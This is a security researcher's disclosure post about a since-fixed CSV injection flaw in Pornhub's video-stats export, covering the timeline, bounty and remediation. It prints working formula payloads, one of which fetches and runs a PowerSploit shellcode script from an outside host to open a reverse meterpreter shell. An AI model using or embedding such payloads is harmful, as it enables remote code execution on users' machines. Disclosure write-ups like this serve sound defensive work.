# CSV Injection -> Meterpreter on Pornhub
This post will discuss an issue I found regarding CSV injection on Pornhub.com, allowing a remote attacker to inject malicious code into video titles resulting in potential full compromise of content creators and other users.

**Note: Pornhub have advised that they will no longer be rewarding for this type of bug. Additionally, this issue has now been fixed, Pornhub have closed the report and pushed out a code fix**

Difficulty: **Medium** 
Risk: **High**
Affected URLs: pornhub.com 
Report Link: https://hackerone.com/reports/146593
Date Reported: June 22nd, 2016 
Date Report Made Public: July 4th, 2016
Bounty Paid: **$500**

This issue has been marked as high risk in this scenario based upon the affected user base and locations, however in a normal situation this would be regarded as Medium/Low.

######Timeline of Events
 - Reported on Hackerone to Pornhub: 22nd  June  2016
 - Issue Marked as Informative: 30th June 2016
 - Issue Publicly Disclosed: 4th July 2016
 - Issue Reopened: 20th July 2016
 - Pornhub Award $500 Bounty: 27th July 2016
 - Pornhub Push and Verify Fixed: 27th July 2016

**tl;dr this vulnerability is exploiting CSV injection, to gain meterpreter session on a victim's local system.**

I identified that the export video stats function was vulnerable to CSV injection that could be chained with a meterpreter payload resulting in client side remote code execution. The payload used to achieve the proof of concept is as follows:

`@SUM(1+2+3)*cmd|' /C calc'!A0`

This will launch calculator when the spreadsheet is downloaded and launched, it was identified that pornhub takes certain steps to attempt to escape this however it seems that the `@` character has been missed from the blacklisted characters and thus makes this attack possible. 

To highlight the risk of this vulnerability, executing calc.exe isn’t enough sometimes, it doesn't look as impressive as a meterpreter shell. This is possible by using the following value:

`@SUM(1+2+3)*cmd|'/C powershell IEX(wget 0r.pe/p)'!A0`

This payload works by, when the CSV file is opened powershell is launched in the background which attempts to grab the Powersploit payload of Invoke-Shellcode to attempt a reverse shell connection back to the attacker's server.

####Remediation
The recommended steps to remediate this issue in particular would be to ensure that video names contain only alpha-numeric characters and cannot be modified to add arbitrary characters.  

For more information on this type of vulnerability please see the other post I did about [CSV Injection](https://blog.zsec.uk/csv-dangers-mitigations/).

---

